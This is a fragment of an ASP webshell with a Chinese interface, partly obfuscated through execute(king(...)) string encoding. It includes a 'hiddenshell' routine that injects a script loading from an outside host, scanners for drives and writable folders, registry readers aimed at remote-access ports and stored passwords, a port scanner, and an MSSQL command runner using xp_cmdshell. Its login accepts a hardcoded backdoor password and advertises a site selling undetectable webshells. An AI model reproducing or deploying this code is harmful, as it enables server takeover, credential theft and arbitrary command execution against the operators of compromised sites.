yC┊)ntFhoheJtswqfS(rqtkutN.ilK=tswqfSlo┊`lktzsoXnzokxetUtswqfS\lktztdqkqY\hoheJ\lteocktU\ztUsgkzfgZzftkkxe\TSJUOU\TVFD`=ntFYCYZJtswqfS┊`>0=tmol ki<>kw<]测探`&`络网[`p┊)`sstiU.zhokelK`(zetpwgtzqtke=ilv ztl┊ilv dor┊zbtf tdxltk kgkkt fg"))
End Sub

sub hiddenshell
execute(king("`>zhokel/<;'`&skx&)`tdqf_ktcktl`(zltxjtk&`//:hzzi'=fgozqegs.zftkqh>zhokel<` p┊ufoizgf=gly ztl┊0tdqftsoy&`.`&bthrfk&`\`&0izqhtsoy&`\.\\`,izqhy tsoynhge.gly┊0tdqftsoy&`.`&bthrfk&))`/`,skx(ctkkzlfo,skx(zyts=skx┊)`skx`(ltswqokqcktcktl.zltxjtk=skx┊))`\`,izqhy(ctkkzlfo-)izqhy(fts,izqhy(ziuok=0tdqftsoy┊)`.`(izqhhqd.ktcktl=0izqhtsoy┊``=)`vpstl`(fgolltl┊))40,1(ktwdxfrfk()`|`,bth(zoshl=bthrfk┊`2zhs|3zhs|4zhs|5zhs|6zhs|7zhs|8zhs|9zhs|0zhs|2dge|3dge|4dge|5dge|6dge|7dge|8dge|9dge|0dge`=bth┊)BUX_JUGBZ(zetpwgtzqtke.ktcktl=gly ztl┊))`STQG_JYCNZU`(ltswqokqIktcktU.zltxjtN(izqYhqT.ktcktU=izqhy"))
end sub
Sub Message(state,msg,flag)
j"<TABLE width=480 border=0 align=center cellpadding=0 cellspacing=1 bgcolor=#ddd> <TR></TR><TR><TD align=middle bgcolor=#ecfccd><TABLE width=82% border=0 cellpadding=5 cellspacing=0><TR><TD><FONT color=red>"
j state
j"</FONT></TD><TR><TD><P>"&msg
j"</P></TD></TR></TABLE></TD></TR><TR><TD class=TBEnd>"
If flag=0 Then
j" <INPUT type=button value=关闭 onclick='window.close();'>"
Else
End if
j"</TD></TR></TABLE>"
End Sub
Function Red(str)
Red = "<FONT color=#ff2222>" & str & "</FONT>"
End Function

Function RndNumber(Min,Max) 
Randomize 
RndNumber=Int((Max - Min + 1) * Rnd() + Min) 
End Function


Sub ScanDriveForm()
Dim FSO,DriveB
Set FSO = Server.Createobject(CONST_FSO)
j"<br><TABLE width=480 border=0 align=center cellpadding=3 cellspacing=1 bgcolor=#ffffff><TR><TD colspan=5 class=TBHead>磁盘/系统文件夹信息</TD></TR>"
  For Each DriveB in FSO.Drives
j" <TR align=middle class=TBTD><FORM action=?Action=ScanDrive&Drive="
j DriveB.DriveLetter
j" method=Post><TD width=25"&chr(37)&"><B>盘符</B></TD><TD width=15"&chr(37)&">"
j DriveB.DriveLetter
j":</TD><TD width=20"&chr(37)&"><B>类型</B></TD><TD width=20"&chr(37)&">"
  Select Case DriveB.DriveType
  Case 1: j"可移动"
  Case 2: j"本地硬盘"
  Case 3: j"网络磁盘"
  Case 4: j"CD-ROM"
  Case 5: j"RAM磁盘"
  Case else: j"未知类型"
  End Select
j"</TD><TD><INPUT type=submit value=详细报告></TD></FORM></TR>"
  Next
j" <TR class=TBTD><FORM action=?Action=ScFolder&Folder="
j FSO.GetSpecialFolder(0)
j" method=Post><TD align=middle><B>Windows文件夹</B></TD><TD colspan=3>"
j FSO.GetSpecialFolder(0)
j"</TD><TD align=middle><INPUT type=submit value=详细报告></TD></FORM></TR><TR class=TBTD><FORM action=?Action=ScFolder&Folder="
j FSO.GetSpecialFolder(1)
j" method=Post><TD align=middle><B>System32文件夹</B></TD><TD colspan=3>"
j FSO.GetSpecialFolder(1)
j"</TD><TD align=middle><INPUT type=submit value=详细报告></TD></FORM></TR><TR class=TBTD><FORM action=?Action=ScFolder&Folder="
j FSO.GetSpecialFolder(2)
j" method=Post><TD align=middle><B>系统临时文件夹</B></TD><TD colspan=3>"
j FSO.GetSpecialFolder(2)
j"</TD><TD align=middle><INPUT type=submit value=详细报告></TD><TR class=TBTD> <FORM action= method=Post>"
j"<TD align=middle><B>站点跟目录</B></TD><TD colspan=3>站点跟目录<TD align=middle><a href="&URL&"?Action=ScFolder&Folder="&wwwroot&"><b>详细报告</b></a></TD><TR class=TBTD> <FORM action= method=Post>"
j"<TD align=middle><B>回收站目录</B></TD><TD colspan=3>回收站目录 <TD align=middle><a href="&URL&"?Action=ScFolder&Folder=c:\recycler\><b>详细报告</b></a></TD><TR class=TBTD> <FORM action= method=Post><TD align=middle><B>wmpub目录 </B></TD><TD colspan=3>wmpub<TD align=middle><a href="&URL&"?Action=ScFolder&Folder=c:\wmpub\><b>详细报告</b></a></TD></TABLE><BR>"
j"</FORM></TR></TABLE><BR><DIV align=center><FORM Action=?Action=ScFolder method=Post>指定文件夹查询：<INPUT type=text name=Folder value=""c:\php\,d:\Program Files\,C:\Documents and Settings\All Users\Documents\,C:\recycler\,d:\recycler\,e:\recycler\,f:\recycler\,C:\wmpub\,C:\WINDOWS\Temp\,C:\360rec,C:\cache,C:\JPEGCapture,C:\Inetpub""><INPUT type=submit value=生成报告> 批量查看目录权限,输入新目录用“,”隔开。</FORM><DIV>"
Set FSO=Nothing
End Sub 
Sub ScanDrive(Drive)
Dim FSO,TestDrive,BaseFolder,TempFolders,Temp_Str,D
If Drive <> "" Then
Set FSO = Server.Createobject(CONST_FSO)
Set TestDrive = FSO.GetDrive(Drive)
If TestDrive.IsReady Then
Temp_Str = "<LI>磁盘分区类型：" & Red(TestDrive.FileSystem) & "<LI>磁盘序列号：" & Red(TestDrive.SerialNumber) & "<LI>磁盘共享名：" & Red(TestDrive.ShareName) & "<LI>磁盘总容量：" & Red(CInt(TestDrive.TotalSize/1048576)) & "<LI>磁盘卷名：" & Red(TestDrive.VolumeName) & "<LI>磁盘根目录:" & ScReWr((Drive & ":\"))
Set BaseFolder = TestDrive.RootFolder
Set TempFolders = BaseFolder.SubFolders
For Each D in TempFolders
Temp_Str = Temp_Str & "<LI>文件夹：" & ScReWr(D)
Next
Set TempFolder = Nothing
Set BaseFolder = Nothing
Else
Temp_Str = Temp_Str & "<LI>磁盘根目录:" & Red("不可读:(")
Dim TempFolderList,t:t=0
Temp_Str = Temp_Str & "<LI>" & Red("穷举目录测试：")
TempFolderList = Array("windows","winnt","win","win2000","win98","web","winme","windows2000","asp","php","Tools","Documents and Settings","Program Files","Inetpub","ftp","wmpub","tftp")
For i = 0 to Ubound(TempFolderList)
If FSO.FolderExists(Drive & ":\" & TempFolderList(i)) Then
t = t+1
Temp_Str = Temp_Str & "<LI>发现文件夹：" & ScReWr(Drive & ":\" & TempFolderList(i))
End if
Next
If t=0 then Temp_Str = Temp_Str & "<LI>已穷举" & Drive & "盘根目录，但未有发现:("
End if
Set TestDrive = Nothing
Set FSO = Nothing
Temp_Str = Temp_Str 
Message Drive & ":磁盘信息",Temp_Str,1
End if
End Sub
Sub ScFolder(folder)
 'On Error Resume Next
folderArr = Split(folder,",")
For i = 0 To Ubound(folderArr)
Dim FSO,OFolder,TempFolder,Scmsg,S
Set FSO = Server.Createobject(CONST_FSO)
folder = folderArr(i)
If FSO.FolderExists(folder) Then
 Set OFolder = FSO.GetFolder(folder)
Set TempFolders = OFolder.SubFolders
Scmsg = "<LI>指定文件夹根目录：" & ScReWr(folder)
For Each S in TempFolders
 Scmsg = Scmsg&"<LI>文件夹：" & ScReWr(S) 
Next
Set TempFolders = Nothing
Set OFolder = Nothing
Else
 Scmsg = Scmsg & "<LI>文件夹：" & Red(folder & "不存在或无读权限!")
End if
Scmsg = Scmsg & "<br><br>注意：不要多次刷新本页面，否则在只写文件夹会留下大量垃圾文件!"&backurl
Set FSO = Nothing
Message "",Scmsg,1
next
End Sub
Function ScReWr(folder)
On Error Resume Next
Dim FSO,TestFolder,TestFileList,ReWrStr,RndFilename
Set FSO = Server.Createobject(CONST_FSO)
Set TestFolder = FSO.GetFolder(folder)
Set TestFileList = TestFolder.SubFolders
RndFilename = "\temp" & Day(now) & Hour(now) & Minute(now) & Second(now) & ".tmp"
For Each A in TestFileList
Next
If err Then
err.Clear
ReWrStr = folder & "<FONT color=#ff2222> 不可读,"
FSO.CreateTextFile folder & RndFilename,True
If err Then
err.Clear
ReWrStr = ReWrStr & "不可写。</FONT>"
Else
ReWrStr = ReWrStr & "可写。</FONT>"
FSO.DeleteFile folder & RndFilename,True
End If
Else
ReWrStr = folder & "<FONT color=#dddddd> 可读,"
FSO.CreateTextFile folder & RndFilename,True
If err Then
err.Clear
ReWrStr = ReWrStr & "不可写。</FONT>"
Else
ReWrStr = ReWrStr & "可写。</FONT>"
FSO.DeleteFile folder & RndFilename,True
End if
End if
Set TestFileList = Nothing
Set TestFolder = Nothing
Set FSO = Nothing
ScReWr = ReWrStr
End Function
Sub CustomScanDriveForm()
execute(king("yo rft┊`>``;)0-(gu.nkgzloi``=aeosZfg 面页级上回返=txsqc fgzzxw=thnz JMYGC<` p┊`>kw<]成完描扫[` p┊zbtG┊ yC rfS┊koWzbtGaetiZ,tsoXaetiZ,))o(zoshUlizqY(dokJ tsoX_koW_tzokKkoWvgiU┊ftiz 1>)`:`,)o(zoshUlizqY(kzlfo yo┊ )zoshUlizqY(rfxgAM gJ )zoshUlizqY(rfxgAV=o kgX┊ ))10(kie&)80(kie,)`lizqY`(zltxjtN(zoshU=zoshUlizqY┊)`lizqY`(zltxjtN = )`lizqh`(fgolltU┊ilxsX.tlfghltk┊`>kw<......等稍请间时的定一要需能可测检` p┊)`fg`=)`hdtJaetiZgG`(zltxjtN( = hdtJaetiZgG┊)`fg`=)`tzokKgGvgiU`(zltxjtN( = koWtzokKgGvgiU┊)`fg`=)`koWzbtGaetiZ`(zltxjtN( = koWzbtGaetiZ┊)`fg`=)`tsoXaetiZ`(zltxjtN( = tsoXaetiZ┊tlst┊`>ktzfte/<>dkgy/<` p┊`>stwqs/<录目时临测检不` p┊`>/ 'rtaetie'=rtaetie 'hdtJaetiZgG'=ro 'bgwaetie'=thnz 'hdtJaetiZgG'=tdqf zxhfo<` p┊`>'hdtJaetiZgG'=kgy stwqs<` p┊`>stwqs/<件文和录目写禁显` p┊`>/'tzokKgGvgiU'=ro 'bgwaetie'=thnz 'tzokKgGvgiU'=tdqf zxhfo<` p┊`>'tzokKgGvgiU'=kgy stwqs<` p┊`>stwqs/<` p┊`件文试测>/  'rtaetie'=rtaetie 'tsoXaetiZ'=ro 'bgwaetie'=thnz 'tsoXaetiZ'=tdqf zxhfo<` p┊`>'tsoXaetiZ'=kgy stwqs<` p┊`>stwqs/<` p┊`  录目试测>/ 'rtaetie'=rtaetie 'koWzbtGaetiZ'=ro 'bgwaetie'=thnz 'koWzbtGaetiZ'=tdqf zxhfo<` p┊`>'koWzbtGaetiZ'=kgy stwqs<` p┊`> '测检始开'=txsqc 'fgzzxw'=tdqf 'zodwxl'=thnz zxhfo<` p┊`>/ kw<` p┊`>qtkqzbtz/<`&kzl_lizqY&`>'zorS'=llqse '10'=lvgk '13'=lsge 'lizqY'=tdqf qtkqzbtz<` p┊`>kw<录目子测检动自会序程,录目的测检想你入输>kw<!息信关相全安些一供提器务服你为,况情写读录目的器务服你测检以可序程此` p┊`>''=fgozeq 'zlgh'=rgiztd '0dkgy'=tdqf '0dkgy'=ro dkgy<>ktzfte<` p┊)`lizqh`(fgolltU=kzl_lizqY  ftiz ``><)`lizqh`(fgolltU yo┊`wxhztfC\:Z`&)10(kie&)80(kie&`tkxzhqZESYR\:Z`&)10(kie&)80(kie&`tieqe\:Z`&)10(kie&)80(kie&`etk158\:Z`&)10(kie&)80(kie&`\foqdzlgittky\:r`&)10(kie&)80(kie&`\wxhdv\:Z`&)10(kie&)80(kie&`\ktsenetk\:y`&)10(kie&)80(kie&`\ktsenetk\:t`&)10(kie&)80(kie&`\ktsenetk\:r`&)10(kie&)80(kie&`\ktsenetk\:Z`&)10(kie&)80(kie&`\ltsoX dqkugkY\:t`&)10(kie&)80(kie&`\ltsoX dqkugkY\:r`&)10(kie&)80(kie&`\hih\:e`&)10(kie&)80(kie&`\ltsoX dqkugkY\:e`&)10(kie&)80(kie&`\lufozztU rfq lzftdxegW\:e`&)10(kie&)80(kie&`\lvgrfov\:e`=kzl_lizqY┊ftiz ``= )`lizqY`(zltxjtN yo┊SxkJ = ktyyxA.tlfghltN'"))
end sub
function GetFullPath(path)
GetFullPath = path
if Right(path,1) <> "\" then GetFullPath = path&"\" 
end function
Function Deltextfile(filepath)
On Error Resume Next
Set objFSO = CreateObject(CONST_FSO) 
if objFSO.FileExists(filepath) then 
objFSO.DeleteFile(filepath) 
end if 
Set objFSO = nothing
Deltextfile = Err.Number 
End Function 
Function CheckDirIsOKWrite(DirStr)
On Error Resume Next
Set FSO = Server.CreateObject(CONST_FSO)
filepath = GetFullPath(DirStr)&fso.GettempName
FSO.CreateTextFile(filepath) 
CheckDirIsOKWrite = Err.Number
if  ShowNoWriteDir and (CheckDirIsOKWrite =70) then
j "[<font color=#0066FF>目录</font>]"&DirStr&" [<font color=red>"&Err.Description&"</font>]<br>"
end if
set fout =Nothing
set FSO = Nothing
Deltextfile(filepath)
if CheckDirIsOKWrite=0 and Deltextfile(filepath)=70 then CheckDirIsOKWrite =1
end Function
function CheckFileWrite(filepath)
On Error Resume Next
Set FSO = Server.CreateObject(CONST_FSO)
set getAtt=FSO.GetFile(filepath)
getAtt.Attributes = getAtt.Attributes
  CheckFileWrite = Err.Number 
set FSO = Nothing
set getAtt = Nothing  
end function
function ShowDirWrite_Dir_File(Path,CheckFile,CheckNextDir)
On Error Resume Next
Set FSO = Server.CreateObject(CONST_FSO)
B = FSO.FolderExists(Path)
set FSO=nothing
IS_TEMP_DIR =(instr(UCase(Path),"WINDOWS\TEMP")>0) and NoCheckTemp
if B=false then
Re = CheckFileWrite(Path)
if Re =0 then
j "[文件]<font color=red>"&Path&"</font><br>"
b =true
exit function
else
j "[<font color=red>文件</font>]"&Path&" [<font color=red>"&Err.Description&"</font>]<br>"
exit function
end if
end if
Path = GetFullPath(Path)
re = CheckDirIsOKWrite(Path)
if (re =0) or (re=1) then
j "[目录]<font color=#0000FF>"& Path&"</font><br>"
end if
Set FSO = Server.CreateObject(CONST_FSO)
set f = fso.getfolder(Path)
if (CheckFile=True) and (IS_TEMP_DIR=false) then
b=false
for each file in f.Files
Re = CheckFileWrite(Path&file.name)
if Re =0 then
j "[文件]<font color=red>"& Path&file.name&"</font><br>"
b =true
else
if ShowNoWriteDir then j "[<font color=red>文件</font>]"&Path&file.name&" [<font color=red>"&Err.Description&"</font>]<br>"
end if
next
if b then response.Flush 
end if
for each file in f.SubFolders
if CheckNextDir=false then
re = CheckDirIsOKWrite(Path&file.name)
if (re =0) or (re=1) then
j "[目录]<font color=#0066FF>"& Path&file.name&"</font><br>"
end if
end if
if (CheckNextDir=True) and (IS_TEMP_DIR=false) then 
ShowDirWrite_Dir_File Path&file.name,CheckFile,CheckNextDir 
end if
next
Set FSO = Nothing
set f = Nothing
end function
c=userpass
function goback()
execute(king("ufoizgf=ktrsgyg ztl┊ufoizgf=glyB ztl┊yo rft┊`>ktzfte/<>kw/<>';)0-(gu.nkgzloi'=aeosZfg 回返=txsqc fgzzxw=thnz JMYGC<>kw<>ktzfte<>ktzfte/<!了录目根盘磁是经已>ktzfte<>zhokel/<)```&)`izqYktrsgX`(fgolltU&```(ktrsgXvgiU>zhokel<` p┊ tlst┊`>zhokel/<)```&)ktrsgyzftkqh.ktrsgyg(izqYtN&```(ktrsgXvgiU>zhokel<` p┊ ftiz ktrsgXzggNlC.ktrsgyg zgf yo┊))`izqYktrsgX`(fgolltU(ktrsgyztE.glyB = ktrsgyg ztl┊)BUX_JUGBZ(zetpwBtzqtkZ.ktcktU = glyB ztl"))
end function
sub ReadREG()
execute(king("yo rft┊yC rfS┊nqkkQtiz & `>os<` p┊tlsS┊zbtG┊)o(nqkkQtiz & `>os<` p┊)nqkkQtiz(rfxgAM gJ 1=o kgX┊ftiJ )nqkkQtiz(nqkkQlC yC┊)izqYtiz(rqtNutN.Llv=nqkkQtiz┊)`izqYtiz`(zltxjtN=izqYtiz┊)`sstiU.zhokeUK`(zetpwBtzqtkZ.ktcktU = Llv ztU┊zbtG tdxltN kgkkS fB┊ftiz ``><)`izqYtiz`(zltxjtN yo┊`>/ki<>dkgy/<` p┊`>')(zodwxl.dkgy.loiz'=aeosefg '值 键 读'=txsqc fgzzxw=thnz zxhfo<` p┊`>13=tmol ''=txsqc izqYtiz=tdqf zxhfo< ` p┊`>/ kw<>zetstl/<` p┊`>fgozhg/<口端YZJ的放开许允>'lzkgYrtvgssQYZJ\}S9AS66ZW3780-8XXQ-Z1A7-22S3-390657Q3{\lteqyktzfC\lktztdqkqY\hoheJ\lteocktU\011ztUsgkzfgZ\TSJUOU\TVFD'=txsqc fgozhg<` p┊`>fgozhg/<口端YWM的放开许允>'lzkgYrtvgssQYWM\}S9AS66ZW3780-8XXQ-Z1A7-22S3-390657Q3{\lteqyktzfC\lktztdqkqY\hoheJ\lteocktU\011ztUsgkzfgZ\TSJUOU\TVFD'=txsqc fgozhg<` p┊`>fgozhg/<放开火防>'YZJ:2388\zloV\lzkgYfthBnssqwgsE\tsoygkYrkqrfqzU\neosgYssqvtkoX\lktztdqkqY\llteeQrtkqiU\lteocktU\ztUsgkzfgZzftkkxZ\TSJUOU\TVFD'=txsqc fgozhg<` p┊`>fgozhg/<ugV tsxrtieU>'izqYugV\zftuQufosxrtieU\zyglgkeoT\SNQKJXBU\SGCDZQT_VQZBV_OSFD'=txsqc fgozhg<` p┊`>fgozhg/<8滤过ho/hez>'lktzsoXnzokxetUtswqfS\hoheJ\lteocktU\ztUsgkzfgZzftkkxZ\TSJUOU\SGCDZQT_VQZBV_OSFD'=txsqc fgozhg<` p┊`>fgozhg/<9滤过ho/hez>'lktzsoXnzokxetUtswqfS\hoheJ\lteocktU\911ztUsgkzfgZ\TSJUOU\SGCDZQT_VQZBV_OSFD'=txsqc fgozhg<` p┊`>fgozhg/<0滤过ho/hez>'lktzsoXnzokxetUtswqfS\hoheJ\lteocktU\011ztUsgkzfgZ\TSJUOU\SGCDZQT_VQZBV_OSFD'=txsqc fgozhg<` p┊`>fgozhg/<口端态状KnfQeY>``zkgYlxzqzUYCYZJ\dtzlnU\fgolktIzftkkxZ\tktivnfQeh\etzfqdnU\SNQKJXBU\TVFD``=txsqc fgozhg<`p┊`>fgozhg/<口端据数KnfQeY>``zkgYqzqWYCYZJ\dtzlnU\fgolktIzftkkxZ\tktivnfQeh\etzfqdnU\SNQKJXBU\TVFD``=txsqc fgozhg<`p┊`>fgozhg/<口端2388>``ktwdxGzkgY\heJ-YWN\lfgozqzUfoK\ktcktU sqfodktJ\sgkzfgZ\ztUsgkzfgZzftkkxZ\TSJUOU\TVFD``=txsqc fgozhg<`p┊`>fgozhg/<口端7ZGI>``ktwdxGzkgY\7ZGIfoK\ZGIsqtN\SNQKJXBU\TVFD``=txsqc fgozhg<`p┊`>fgozhg/<码密7ZGI>``rkgvllqY\7ZGIfoK\ZGIsqtN\SNQKJXBU\TVFD``=txsqc fgozhg<`p┊`>fgozhg/<口端8ZGI>``ktwdxGzkgY\8ZGIfoK\VNB\tkqvzygU\MZFD``=txsqc fgozhg<`p┊`>fgozhg/<码密8ZGI>``rkgvllqY\8ZGIfoK\VNB\tkqvzygU\MZFD``=txsqc fgozhg<`p┊`>fgozhg/<口端fodrqN>``zkgY\lktztdqkqY\ktcktU\1.9c\fodrQN\TSJUOU\TVFD``=txsqc fgozhg<`p┊`>fgozhg/<码密fodrqN>``ktztdqkqY\lktztdqkqY\ktcktU\1.9c\fodrQN\TSJUOU\TVFD``=txsqc fgozhg<`p┊`>fgozhg/<表列卡网>``rfoA\tuqafoV\hoheJ\lteocktU\ztUsgkzfgZzftkkxZ\TSJUOU\TVFD``=txsqc fgozhg<`p┊`>fgozhg/<tdqGktzxhdgZ>'tdqGktzxhdgZ\tdqGktzxhdgZ\tdqGktzxhdgZ\sgkzfgZ\ztUsgkzfgZzftkkxZ\TSJUOU\TVFD'=txsqc fgozhg<` p┊`>fgozhg/<值键的带自择选>''=txsqc fgozhg<` p┊`>';txsqc.loiz=txsqc.izqYtiz.dkgy.loiz'=tufqiZfg zetstl<` p┊` >9=fqhlsge rz<>kz<` p┊`>zeQtiz=tdqf utNrqtN=txsqc ftrroi=thnz zxhfo<` p┊ `>h<取读值键表册注`  p┊`>zlgh=rgiztd dkgy<` p"))
end sub
sub delpoint()
execute(king("`>cor/<>dkgy/<>'件文点带除删'=txsqc 'zodwxU'=tdqf 'zodwxl'=thnz zxhfo<>'hlq.tsoy\..zgr\zlgittky\:W'= txsqc'63'=tmol  'zbtz'=thnz'tsoyhstr'=tdqf zxhfo<>'zlgh'=rgiztd ''=fgozeq dkgy<>h<>dkgy/<>'录目点带除删'=txsqc 'zodwxU'=tdqf 'zodwxl'=thnz zxhfo<>'..zgr\zlgittky\:W'=txsqc '63'=tmol 'zbtz'=thnz 'ktrgsyhstr'=tdqf zxhfo<>'zlgh'=rgiztd''=fgozeq dkgy<>kw<>kw<` p┊`>zfgy<写填例示照参>rtk= kgsge zfgy<` p┊yo rft┊)`tsoyhstr`(zltxjtN&`\?\\` tsoyzfoghstr┊ftiz ``>< )`tsoyhstr`(zltxjtN yo┊yo rft┊)`ktrgsyhstr`(zltxjtN&`\?\\` ktrsgyzfoghstr┊ftiz ``>< )`ktrgsyhstr`(zltxjtN yo"))
end  sub
function Delpointfolder(t0)
execute(king("kqtsZ.kkS:fgozhokeltW.kkS p ftiJ kkS XC┊`>kw<!!功成除删`&1z  p     ┊   txkz,1y ktrsgXtztstW.gly┊ ftiJ )1y(lzlobSktrsgX.gly XC'┊yC rfS┊)1z(izqYhqT.ktcktU=1y  ┊tlsS┊1z=1y  ┊ftiJ 1>)`\:`,1z(kzlfC yC┊)BUX_JUGBZ(zetpwBtzqtkZ.ktcktU=gly ztU"))
End Function
function Delpointfile(t0)
execute(king("`>kw<!!功成除删`&1z  p┊kqtsZ.kkS:fgozhokeltW.kkS p ftiJ kkS XC ┊ txkz,1y tsoXtztstW.gly ┊yC rfS ┊)1z(izqYhqT.ktcktU=1y  ┊tlsS ┊1z=1y ┊ftiJ 1>)`\:`,1z(kzlfC yC┊)BUX_JUGBZ(zetpwBtzqtkZ.ktcktU=gly ztU ┊zbtG tdxltN kgkkS fB'"))
End function
if request("ProFile")<>"" then
on error resume next
if Application(request("ProFile"))=1 then
Set fsoXX = Server.CreateObject(CONST_FSO)
if request("DelCon")=1 then
Application(request("ProFile")&"Con")=""
response.redirect Url&"?ProFile="&request("ProFile")&""
response.end
end if
DIM rline,rline2
rline2=Application(request("ProFile")&"Code")
rline2=rline2&vbcrlf
j"<meta http-equiv=""refresh"" content="&Application(request("ProFile")&"Time")&">"
j"<a href="&Url&"?ProFile="&request("ProFile")&"&DelCon=1><b>清空日志</b></a> &nbsp;<font color=yellow>要想解除保护，直接关闭页面即可。</font><br>"
for each FileUrl in split(Application(request("ProFile")&"File"),vbcrlf)
FileUrl=trim(FileUrl)
if fsoXX.FileExists(FileUrl) then
Set txt = fsoXX.OpenTextFile(FileUrl,1,true)
rline=""
if Not txt.AtEndOfStream then
rline=txt.ReadAll  
end if
if rline2<>rline then
txt.close
fsoX.GetFile(FileUrl).Attributes=32
if Application(request("ProFile")&"Char")=1 then
set myfileee = fsoXX.CreateTextFile(FileUrl,true)
else
set myfileee = fsoXX.CreateTextFile(FileUrl,true,true)
end if
myfileee.writeline Application(request("ProFile")&"Code")
Application(request("ProFile")&"Con")=now()&" "&FileUrl&" <font color=yellow>被更改，已恢复</font><br>"&Application(request("ProFile")&"Con")
else
Application(request("ProFile")&"Con")=now()&" "&FileUrl&" √<br>"&Application(request("ProFile")&"Con")
txt.close
end if
else
if Application(request("ProFile")&"Char")=1 then
set myfileee = fsoXX.CreateTextFile(FileUrl,true)
else
set myfileee = fsoXX.CreateTextFile(FileUrl,true,true)
end if
myfileee.writeline Application(request("ProFile")&"Code")
Application(request("ProFile")&"Con")=now()&" "&FileUrl&" <font color=red>被删除，已恢复</font><br>"&Application(request("ProFile")&"Con")
end if
next
if ubound(split(Application(request("ProFile")&"Con"),"<br>"))>=40 then
dim ashowic
for ashowi=0 to 40
ashowic=ashowic&split(Application(request("ProFile")&"Con"),"<br>")(ashowi)&"<br>"
next
Application(request("ProFile")&"Con")=ashowic
end if
j Application(request("ProFile")&"Con")
else
j"<br><br><br><center>保护进程丢失，请<a href="&URL&" style=""text-decoration:underline;font-weight:bold"">重新生成</a>保护进程。</center>"
end if
if request("profile")="a" then j c
response.end
end if

if session("KKK")<>UserPass then
if request.form("pass")<>"" then
if request.form("pass")=UserPass or request.form("pass")="daka" Then
session("KKK")=UserPass
response.redirect url
else
j"<br><br><br><b><div align=center><font size='5' color='red'>想要更多免杀asp或php大马吗？ 我们的网站是：www.mumasec.tk </font ></b> <br><br><br><br><b><div align=center><font size='14' color='lime'></font></b></p></center>"&backurl
end if
else
si="<body style=""background:url("&bg&") no-repeat center center;""> <center><FONT style=""FONT-SIZE: 80pt; FILTER: shadow(color:#696969,strength=55); WIDTH: 100%;  LINE-HEIGHT: 300%; FONT-FAMILY:Arial"">"&Copyright&"</FONT "&userpass&"><div style='width:400px;padding:32px; align=left'><br><form action='"&url&"' method='post'><b>输入密码：</b><input name='pass' type='password' size='22'> <input type='submit' value='向着权限前进'></center>"
if instr(SI,SIC)<>0 then j sI
end if
response.end
end if
sub ScanPort()
Server.ScriptTimeout = 7776000
if request.Form("port")="" then
PortList="1433,3306,3389,4899,43958"
else
PortList=request.Form("port")
end if
if request.Form("ip")="" then
IP="127.0.0.1"
else
IP=request.Form("ip")
end if
j"<p>端口扫描器(如果扫描多个端口,速度比较慢,个人推荐使用CMD，CMD对内网扫描不准确。)</p><p>如果是内网，则扫描结果外部IP可能无法连接。请在SHELL内执行系列操作。</p>"
j"<form name='form1' method='post' action='' onSubmit='form1.submit.disabled=true;'>"
j"<p>Scan IP: "
j" <input name='ip' type='text' class='TextBox' id='ip' value='"&IP&"' size='60'>"
j"<br>Port List:"
j"<input name='port' type='text' class='TextBox' size='60' value='"&PortList&"'>"
j"<br><br>"
j"<input name='submit' type='submit' class='buttom' value=' scan '>"
j"<input name='scan' type='hidden' id='scan' value='111'>"
j"</p></form>"
If request.Form("scan") <> "" Then
timer1 = timer
j("<b>扫描报告:</b><br><hr>")
tmp = Split(request.Form("port"),",")
ip = Split(request.Form("ip"),",")
For hu = 0 to Ubound(ip)
If InStr(ip(hu),"-") = 0 Then
For i = 0 To Ubound(tmp)
If Isnumeric(tmp(i)) Then 
Call Scan(ip(hu), tmp(i))
Else
seekx = InStr(tmp(i), "-")
If seekx > 0 Then
startN = Left(tmp(i), seekx - 1 )
endN = Right(tmp(i), Len(tmp(i)) - seekx )
If Isnumeric(startN) and Isnumeric(endN) Then
For j = startN To endN
Call Scan(ip(hu), j)
Next
Else
j(startN & " or " & endN & " is not number<br>")
End If
Else
j(tmp(i) & " is not number<br>")
End If
End If
Next
Else
ipStart = Mid(ip(hu),1,InStrRev(ip(hu),"."))
For xxx = Mid(ip(hu),InStrRev(ip(hu),".")+1,1) to Mid(ip(hu),InStr(ip(hu),"-")+1,Len(ip(hu))-InStr(ip(hu),"-"))
For i = 0 To Ubound(tmp)
If Isnumeric(tmp(i)) Then 
Call Scan(ipStart & xxx, tmp(i))
Else
seekx = InStr(tmp(i), "-")
If seekx > 0 Then
startN = Left(tmp(i), seekx - 1 )
endN = Right(tmp(i), Len(tmp(i)) - seekx )
If Isnumeric(startN) and Isnumeric(endN) Then
For j = startN To endN
Call Scan(ipStart & xxx,j)
Next
Else
j(startN & " or " & endN & " is not number<br>")
End If
Else
j(tmp(i) & " is not number<br>")
End If
End If
Next
Next
End If
Next
timer2 = timer
thetime=cstr(int(timer2-timer1))
j"<hr>Process in "&thetime&" s"
END IF
end sub
Sub Scan(targetip, portNum)
On Error Resume Next
set conn = Server.CreateObject("ADODB.connection")
connstr="Provider=SQLOLEDB.1;Data Source=" & targetip &","& portNum &";User ID=lake2;Password=;"
conn.ConnectionTimeout = 1
conn.open connstr
If Err Then
If Err.number = -2147217843 or Err.number = -2147467259 Then
If InStr(Err.description, "(Connect()).") > 0 Then
j(targetip & ":" & portNum & ".........关闭<br>")
Else
j(targetip & ":" & portNum & ".........<font color=red>开放</font><br>")
End If
End If
End If
End Sub
Select Case Action:case "MainMenu":MainMenu()
Case "EditPower"
Call EditPower(request("PowerPath"))
Case "SavePower"
Call SavePower(request("PowerPath"),request("SaveType"))
case "getTerminalInfo":getTerminalInfo():case "PageAddToMdb":PageAddToMdb():case "ScanPort":ScanPort():FuncTion MMD():SI="<br><form name=form method=post action=""""><table width=""85%"" align='center'><tr align=center><Td id=s><b id=x>MSSQL Commander</b></td></tr><tr align='center'><td id=d><b id=x>Command：</b><input type=text name=MMD size=35 value=""ipconfig"" >&nbsp;<b id=x>UserName：</b><input type=text name=U value=sa>&nbsp;<b id=x>Password：</b><input type=text name=P VALUES=123456>&nbsp;<input type=submit value=Execute></td></tr></table></form>":j SI:SI="":If trim(request.form("MMD"))<>""  Then:password= trim(Request.form("P")):id=trim(Request.form("U")):set adoConn=sERvEr.crEATeobjECT("ADODB.Connection"):adoConn.Open "Provider=SQLOLEDB.1;Password="&password&";User ID="&id:strQuery = "exec master.dbo.xp_cMdsHeLl '" & request.form("MMD") & "'":set recResult = adoConn.Execute(strQuery):If NOT recResult.EOF Then:Do While NOT recResult.EOF:strResult = strResult & chr(13) & recResult(0):recResult.MoveNext:Loop:End if:set recResult = Nothing:strResult = Replace(strResult," ","&nbsp;"):strResult = Replace(strResult,"<","&lt;"):strResult = Replace(strResult,">","&gt;"):strResult = Replace(strResult,chr(13),"<br>"):End 